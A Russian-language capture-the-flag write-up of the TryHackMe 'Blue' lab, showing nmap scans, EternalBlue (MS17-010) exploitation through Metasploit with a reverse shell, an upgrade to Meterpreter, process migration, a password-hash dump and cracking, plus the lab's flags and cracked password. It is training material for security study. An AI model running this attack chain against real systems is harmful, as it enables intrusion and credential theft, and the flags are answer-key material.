# Машина Blue TryHackMe

## Сканирование портов с помощью Nmap

```bash
nmap -sS -sV 10.81.142.187
```

**Результаты сканирования:**
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-12 15:01 -0400
Nmap scan report for 10.81.142.187
Host is up (0.051s latency).
Not shown: 993 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.45 seconds
```

---

## Сканирование на уязвимости

```bash
nmap --script vuln 10.81.142.187
```

**Результаты сканирования на уязвимости:**
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-12 15:20 -0400
Nmap scan report for 10.81.142.187
Host is up (0.049s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49160/tcp open  unknown
49165/tcp open  unknown

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED

Nmap done: 1 IP address (1 host up) scanned in 100.44 seconds
```

**Обнаружена критическая уязвимость:** EternalBlue (MS17-010) CVE-2017-0143

---

## Эксплуатация уязвимости через Metasploit

1. Запускаем Metasploit:
```bash
msfconsole
```

2. Ищем эксплойт для EternalBlue:
```bash
search EternalBlue
```

3. Используем найденный эксплойт:
```
use exploit/windows/smb/ms17_010_eternalblue
```

4. Проверяем настройки:
```
show options
```

5. Устанавливаем необходимые параметры:
   - Указываем `rhosts` (целевой IP)
   - Исправляем `lhost` на верный
   - Остальные настройки оставляем по умолчанию

6. Устанавливаем полезную нагрузку:
```
set payload windows/x64/shell/reverse_tcp
```

7. Запускаем эксплойт:
```
run
```

**Важное замечание:** Сессия не всегда устанавливается с первого раза. В этом случае необходимо перезагрузить целевую машину и попробовать еще раз.

8. После получения шелла выходим в фон через `CTRL+Z`

---

## Повышение привилегий до Meterpreter

1. Конвертируем шелл в Meterpreter:
```
use post/multi/manage/shell_to_meterpreter
```

2. Настраиваем параметры:
   - Изменяем `Lhost` на верный
   - В `session` указываем нашу сессию

3. Запускаем апгрейд сессии

4. Проверяем создание Meterpreter сессии:
```
sessions
```

5. Проверяем права доступа:
```
getuid
```
**Результат:** `NT AUTHORITY\SYSTEM`

6. Просматриваем процессы:
```
ps
```

7. Мигрируем в процесс `spoolsv.exe`:
```
migrate PID
```

---

## Сбор хешей пользователей

Выполняем дамп хешей:
```
hashdump
```

**Результат:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

---

## Взлом пароля пользователя Jon

Используем сайт **crackstation.net** для подбора хеша пользователя Jon.

**Найденный пароль:** `alqfna22`

---

## Поиск флагов

### Флаг 1
Найден в корне системы согласно методичке:
```
flag{access_the_machine}
```

### Флаг 2
Найден в директории хранения паролей `C:/Windows/system32/config/`:
```
flag{sam_database_elevated_access}
```

### Флаг 3
Поиск с помощью команды:
```bash
search -f flag3.txt
```

Найден по пути `c:\Users\Jon\Documents\flag3.txt`:
```
flag{admin_documents_can_be_valuable}
```

---

## Итог

- **Уязвимость:** EternalBlue (MS17-010)
- **Получен доступ:** NT AUTHORITY\SYSTEM
- **Пароль пользователя Jon:** alqfna22
- **Найдено флагов:** 3
